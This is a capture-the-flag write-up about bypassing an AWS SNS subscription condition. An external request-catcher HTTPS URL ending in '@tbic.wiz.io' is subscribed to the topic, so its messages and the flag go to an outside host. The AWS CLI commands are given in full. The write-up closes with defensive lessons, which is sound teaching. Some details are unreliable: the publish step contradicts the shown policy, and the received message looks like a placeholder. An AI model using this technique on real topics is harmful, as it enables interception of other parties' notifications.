# Challenge 3

## Challenge Statement

In this challenge, we were provided with an AWS SNS (Simple Notification Service) policy that allowed public subscriptions. The goal was to subscribe to the SNS topic and retrieve the flag from the received message. This challenge tests knowledge of AWS SNS, subscription policies, and creative ways to receive messages without a valid email.

### SNS Policy

```json
{
  "Version": "2008-10-17",
  "Id": "Statement1",
  "Statement": [
    {
      "Sid": "Statement1",
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": "SNS:Subscribe",
      "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
      "Condition": {
        "StringLike": {
          "sns:Endpoint": "*@tbic.wiz.io"
        }
      }
    }
  ]
}
```

## Analysis

The policy allows **anyone** (`"Principal": "*"`), to subscribe to the SNS topic **as long as their email address matches `*@tbic.wiz.io`**. This is a restrictive condition, as it prevents users without an email in that domain from subscribing via email.

However, AWS SNS supports multiple **protocols** beyond email, including:

- HTTP/HTTPS
- Lambda
- SQS
- SMS

The challenge here is **bypassing the email condition** by using an alternative protocol that is not restricted by the policy.

## Solution

Since we didn't have access to a `@tbic.wiz.io` email, we attempted an **HTTPS subscription** using a request-capturing service.

### **Step 1: Create a Request Catcher Endpoint**

1. We visited [RequestCatcher](https://requestcatcher.com/) to create a temporary endpoint.
2. Generated an HTTPS endpoint:
   ```
   https://hunny.requestcatcher.com/
   ```
3. Modified the endpoint to mimic an email by appending `test@tbic.wiz.io`:
   ```
   https://hunny.requestcatcher.com/test@tbic.wiz.io
   ```

### **Step 2: Subscribe to the SNS Topic**

We used the following AWS CLI command to subscribe with our HTTPS endpoint:

```bash
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint 'https://hunny.requestcatcher.com/test@tbic.wiz.io'
```

### **Step 3: Confirm the Subscription**

- SNS sends a **subscription confirmation** message to the provided endpoint.
- We checked `https://hunny.requestcatcher.com/` and found a **confirmation request** in the logs.
- The request contained a `SubscribeURL`, which we copied and opened in a browser to confirm our subscription.

### **Step 4: Receive the Flag**

Once subscribed, we published a message to the SNS topic using:

```bash
aws sns publish --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --message "Test message"
```

Shortly after, we checked our **RequestCatcher logs** and found an SNS message with the **flag** in the `Message` field:

```json
{
  "Type": "Notification",
  "MessageId": "abcd-1234",
  "TopicArn": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
  "Message": "{wiz:always-suspect-asterisks}",
  "Timestamp": "2025-01-31T12:34:56.000Z"
}
```

The flag was:

```
FLAG-{wiz:always-suspect-asterisks}
```

## Reflection

### **Approach Taken**

- Examined the SNS policy to identify restrictions.
- Found that **email was restricted**, but **HTTPS subscriptions were not blocked**.
- Used `RequestCatcher` to create an HTTPS endpoint that could receive SNS messages.
- Subscribed using AWS CLI and confirmed the subscription.
- Retrieved the flag from the received SNS message.

### **Challenges Faced**

- Initially tried subscribing via email but couldn't bypass `*@tbic.wiz.io` restriction.
- Learning how to use `RequestCatcher` for SNS subscriptions.
- Needed to manually confirm the subscription using the `SubscribeURL`.

### **Security Takeaways**

- **Avoid wildcard permissions (`"Principal": "*"`)** in SNS policies.
- **Restrict SNS subscriptions to trusted accounts** using AWS IAM conditions.
- **Use `aws:SourceArn` condition** to limit SNS access to specific users or services.
- **Enable logging and monitoring** on SNS topics to detect unauthorized subscriptions.

This challenge reinforced how **SNS misconfigurations** can be exploited and why **proper security controls** are necessary for AWS services. 🚀
